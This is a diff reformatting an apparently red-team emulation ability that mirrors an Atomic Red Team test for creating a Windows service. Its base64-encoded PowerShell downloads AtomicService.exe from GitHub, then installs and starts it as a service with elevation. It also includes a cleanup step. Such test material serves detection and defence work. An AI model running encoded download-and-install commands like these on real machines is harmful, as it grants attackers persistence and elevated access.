@@ -1,25 +1,19 @@
-- id: ffe64f9e-241f-5d30-aac4-f6eb4f2b89f6
+- requirements: []
   name: Soumaia ART Tests - Service Installation PowerShell
   description: 'Installs A Local Service via PowerShell.
 
     Upon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed. (requires elevation)'
   tactic: privilege-escalation
-  technique:
-    attack_id: T1543.003
-    name: 'Create or Modify System Process: Windows Service'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEEAdABvAG0AaQBjAFMAZQByAHYAaQBjAGUALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABBAHQAbwBtAGkAYwBTAGUAcgB2AGkAYwBlAC4AZQB4AGUAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADQAMwAuADAAMAAzAC8AYgBpAG4ALwBBAHQAbwBtAGkAYwBTAGUAcgB2AGkAYwBlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAEEAdABvAG0AaQBjAFMAZQByAHYAaQBjAGUALgBlAHgAZQAiAAoA
-          }
-          New-Service -Name "AtomicTestService_PowerShell" -BinaryPathName ".\AtomicService.exe"
-          Start-Service -Name "AtomicTestService_PowerShell"
-        cleanup: |-
-          Stop-Service -Name "AtomicTestService_PowerShell" 2>&1 | Out-Null
-          try {(Get-WmiObject Win32_Service -filter "name='AtomicTestService_PowerShell'").Delete()}
-          catch {}
-        payloads:
-        - AtomicService.exe
+  technique_id: T1543.003
+  technique_name: 'Create or Modify System Process: Windows Service'
+  executors:
+  - cleanup:
+    - Stop-Service -Name "AtomicTestService_PowerShell" 2>&1 | Out-Null; try {(Get-WmiObject Win32_Service -filter "name='AtomicTestService_PowerShell'").Delete()} catch {}
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - AtomicService.exe
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEEAdABvAG0AaQBjAFMAZQByAHYAaQBjAGUALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABBAHQAbwBtAGkAYwBTAGUAcgB2AGkAYwBlAC4AZQB4AGUAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADQAMwAuADAAMAAzAC8AYgBpAG4ALwBBAHQAbwBtAGkAYwBTAGUAcgB2AGkAYwBlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAEEAdABvAG0AaQBjAFMAZQByAHYAaQBjAGUALgBlAHgAZQAiAAoA }; New-Service -Name "AtomicTestService_PowerShell" -BinaryPathName ".\AtomicService.exe"; Start-Service -Name "AtomicTestService_PowerShell"
+  id: ffe64f9e-241f-5d30-aac4-f6eb4f2b89f6
